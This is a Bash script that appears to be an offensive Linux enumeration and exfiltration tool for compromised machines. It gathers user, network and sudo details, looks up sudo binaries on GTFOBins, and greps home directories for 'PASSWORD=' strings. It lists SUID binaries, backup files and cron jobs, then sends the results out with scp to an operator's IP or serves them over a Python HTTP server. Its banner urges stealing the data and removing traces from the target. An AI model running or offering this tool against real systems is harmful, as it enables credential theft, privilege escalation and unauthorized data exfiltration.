#!/bin/bash

# ========== Colors ==========
CYAN=$'\033[0;36m' # Used for interactive segements
RED=$'\033[0;31m' # Errors and warnings
GREEN=$'\033[0;32m' # Positive notifcations
WHITE=$'\033[0;37m' # Displayed information headers
YELLOW=$'\033[1;33m' # Things of interest
DEF=$'\033[0m' # Defualt color, returns to system settings

# ========== Globals ==========
dest=""
dest2=""
tempfile=""
SUDO_OUTPUT=""

# ========== Functions ==========
do_basic_info() {  # This is a wrapped function. It allows us to call on it later just like we would a variable. It does not execute here.                                
    echo -e "\n${CYAN}========= Basic User Information ==========${DEF}\n"
    echo -e "${WHITE}User:${DEF} $(whoami)"
    echo -e "${WHITE}Hostname:${DEF} $(hostname)"
    echo -e "${WHITE}Groups:${DEF} $(id)"
    echo -e "${WHITE}PATH:${DEF} $PATH"
    echo -e "${WHITE}IP addresses:${DEF} $(ip -4 -o addr show | awk '{print $4}' | cut -d/ -f1 | grep -v '^127\.')" # Gets the IP address while ignoring the loopback address 
}

do_basic_enum() { # Prints out some basic, but useful information about the target machine
    while true; do # I have all the functions wrapped in a loop so if the user inputs the wrong input it does throw an error or exit
        read -rp "${CYAN}Do you want basic enumeration done (y/n)? If yes, enter your password when prompted: ${DEF}" answer1
        case "$answer1" in
            [Yy]*)
                echo -e "\n${CYAN}========= Basic Enumeration ==========${DEF}\n"
                echo -e "${WHITE}Running sudo -l${DEF}"
                SUDO_OUTPUT=$(sudo -l 2>/dev/null) #Checks to see what we can run sudo on
                echo "$SUDO_OUTPUT"
                echo -e "\n${WHITE}Operating System:${DEF}"
                cat /etc/os-release #Shows operating system information
                echo -e "\n${WHITE}Kernel:${DEF}"
                uname -a
                echo -e "\n${WHITE}CPU Information:${DEF}"
                lscpu | grep -E '^Architecture:|^CPU\(s\):' #Shows architecture which may be important if you have to compile an exploit.CPU is just a nice to know.
                break #break stops the while true loop
                ;;
            [Nn]*)
                echo "Enumeration skipped."
                break
                ;;
            *)
                echo -e "${RED}Invalid input. Please enter 'y' or 'n'!${DEF}" # As we see here there is no 'break' so it'll loop again
                ;;
        esac
    done
}

function check_sudo_gtfobins {
    # First, try to find gtfobins.txt next to the script
    GTFO_DIR="$(dirname "$0")"
    GTFO_FILE="$GTFO_DIR/gtfobins.txt"

    # If not found, use locate to find it anywhere on the system
    if [[ ! -f "$GTFO_FILE" ]]; then
        echo -e "${YELLOW}Local gtfobins.txt not found in script directory. Trying system-wide locate...${DEF}"
        GTFO_FILE=$(locate gtfobins.txt 2>/dev/null | grep -m1 'gtfobins.txt')
    fi

    # If still not found, fallback to curl-based lookup
    if [[ ! -f "$GTFO_FILE" ]]; then
        echo -e "${YELLOW}Could not locate gtfobins.txt. Falling back to online GTFOBins lookup.${DEF}"
        local_only=false
    else
        echo -e "${GREEN}Using local GTFOBins list at $GTFO_FILE${DEF}"
        local_only=true
    fi

    if ! echo "$SUDO_OUTPUT" | grep -q "(ALL : ALL)"; then
        echo -e "\n${CYAN}========= GTFOBins Check ==========${DEF}\n"
        echo "$SUDO_OUTPUT" | sed -nE 's/^.*NOPASSWD: (.+)/\1/p' | tr ',' '\n' | xargs -n1 basename | sort -u | while read -r bin; do
            echo -e "${WHITE}Checking GTFOBins for: $bin${DEF}"
            if [[ $local_only == true ]]; then
                if grep -qx "$bin" "$GTFO_FILE"; then
                    echo -e "${GREEN}GTFOBin available for $bin (local match)${DEF}"
                else
                    echo -e "${YELLOW}No GTFOBin found for $bin (local).${DEF}"
                fi
            else
                if curl -s --max-time 5 "https://gtfobins.github.io/gtfobins/$bin/" | grep -q "<title>"; then
                    echo -e "${GREEN}GTFOBin available for $bin!${DEF}"
                else
                    echo -e "${YELLOW}No GTFOBin found for $bin.${DEF}"
                fi
            fi
        done
    fi
}


do_lhf_enum() { # Searches for some basic, possibly exploitable information on the target machine
    while true; do
        read -rp "${CYAN}Do you want to search for low-hanging fruit (y/n)? ${DEF}" answer2
        case "$answer2" in
            [Yy]*)
                echo -e "\n${CYAN}========= LOW-HANGING FRUIT ==========${DEF}\n"
                if echo "$SUDO_OUTPUT" | grep -q "(ALL : ALL)"; then
                    echo -e "${WHITE}Searching for 'PASSWORD=' in .txt, .bak, .conf (sudo):${DEF}" # On the function above I am saying 'If the user had ALL:ALL sudo rights to run it with sudo because we will have access to more'
                    sudo grep --color=always -rnw '/home' --include=\*.{txt,bak,conf} -ie "PASSWORD=" 2>/dev/null
                    #sudo grep -rEi 'pass(word)?\s*[:=]' / --include=\*.{txt,bak,conf} 2>/dev/null # searching the entire directory for something similar to 'password'
                else 
                    echo -e "${WHITE}Searching for 'PASSWORD=' in .txt, .bak, .conf:${DEF}" # This command is for the event the account we are logged in as doesn't have sudo access
                    grep --color=always -rnw '/home' --include=\*.{txt,bak,conf} -ie "PASSWORD=" 2>/dev/null # On both grep commands we are including files that end with .txt, .bak, and .conf
                fi  
                echo -e "\n${WHITE}Backup files:${DEF}"
                find / -type f -name "*.bak" 2>/dev/null # Running the find command looking for any backup files
                echo -e "\n${WHITE}Binaries with SUID permissions:${DEF}" 
                find / -perm -u=s -type f 2>/dev/null # Looking for binaries with SUID permissions
                echo -e "\n${WHITE}Cron Jobs:${DEF}"
                ls -la /etc/cron.daily/ # Looking for any daily cron jobs. Depending on the users rights, we could exploit this to gain a root shell
                break
                ;;
            [Nn]*)
                echo "Low-hanging fruit search skipped."
                break
                ;;
            *)
                echo -e "${RED}Invalid input. Please enter 'y' or 'n'!${DEF}"
                ;;
        esac
    done
}
# This give the user a few options on exfiltrating the output text file
exfil_menu() {
    sed 's/\x1b\[[0-9;]*[a-zA-Z]//g' "$tempfile" > "$dest" # Ensures none of the color codes apear in the output file
    rm -f "$tempfile"                                      # Removes the temporary file that was being used to save the output
    echo -e "\n${WHITE}Finalizing saved output...${DEF}"

    echo -e "\n${CYAN}Do you want to exfiltrate the saved file (${dest2})?${DEF}"
    echo -e "  1) Set up Python HTTP server"
    echo -e "  2) Push file via SCP"
    echo -e "  3) Do nothing"
    while true; do
        read -rp "${CYAN}Enter your choice (1-3): ${DEF}" exfil_choice

        case "$exfil_choice" in
            1)
                tgt_ip=$(ip route get 1 | awk '{print $7; exit}')
                echo -e "${GREEN}Starting Python3 HTTP server on port 8080...${DEF}"
                the_end
                echo -e "${WHITE}Download with: wget http://$tgt_ip:8080/$dest2${DEF}"
                cd "$HOME"
                python3 -m http.server 8080
                ;;
            2)
                echo -e "${WHITE}SCP Push: File will be sent to your home directory.${DEF}"
                read -rp "${CYAN}Username on your box: ${DEF}" hostuser
                read -rp "${CYAN}Your IP address: ${DEF}" hostip
                read -rp "${CYAN}Use non-standard port? (y/n): ${DEF}" port_answer
                if [[ $port_answer =~ ^[Yy]$ ]]; then
                    read -rp "${CYAN}Enter the custom port: ${DEF}" hostport
                    scp -P "$hostport" "$dest" "$hostuser@$hostip:~/"
                else
                    scp "$dest" "$hostuser@$hostip:~/"
                fi
                the_end
                break
                ;;
            3)
                echo -e "${WHITE}No exfiltration selected.Exiting.${DEF}"
                the_end
                break
                ;;
            *)
                echo -e "${RED}Invalid input. Please enter 1, 2, or 3!${DEF}"
                    ;;
                
        esac
    done
}

the_end () { # Some bs terminal art to be egdey 
    cat << "EOF"

          ______
       .-'      '-.
      /            \
     |              |
     |,  .-.  .-.  ,|
     | )(_o/  \o_)( |
     |/     /\     \|
     (_     ^^     _)
      \__|IIIIII|__/
       | \IIIIII/ |
       \   I  I   /
        `--------`

[ SYSTEM ENUMERATION COMPLETE ]
   Save it. Steal it. Own it.

EOF
echo -e "${RED}If you saved the file, be sure to confirm the successful exfiltration and remove it from the target system! Happy enumeration!${DEF}"
echo -e "${DEF}"
}


# ========== Main ==========
echo -e "This script performs basic enumeration. You may choose to save the results.\n"

while true; do
    read -rp "${CYAN}Do you want to save the script output to a file? (y/n): ${DEF}" save_answer
    case "$save_answer" in
        [Yy]*)
            read -rp "${CYAN}Enter filename (e.g., output.txt): ${DEF}" filename
            dest="$HOME/$filename"
            dest2="$filename"
            tempfile=$(mktemp)
            echo -e "${GREEN}Output will be saved to: $dest${DEF}"
            exec > >(tee "$tempfile") 2>&1
            sleep 1
            break
            ;;
        [Nn]*)
            echo -e "${WHITE}Not saving to a file. Let's continue.${DEF}"
            sleep 1
            break
            ;;
        *)
            echo -e "${RED}Invalid input. Please enter 'y' or 'n'.${DEF}"
            ;;
    esac
done

sleep 1
do_basic_info
sleep 1
echo
do_basic_enum
sleep 1
echo
check_sudo_gtfobins
sleep 1
echo
do_lhf_enum
sleep 1

if [[ $save_answer =~ ^[Yy]$ ]]; then
    exfil_menu
    sleep 1
else
    [[ $save_answer =~ ^[Nn]]$ ]];
    the_end
fi
echo



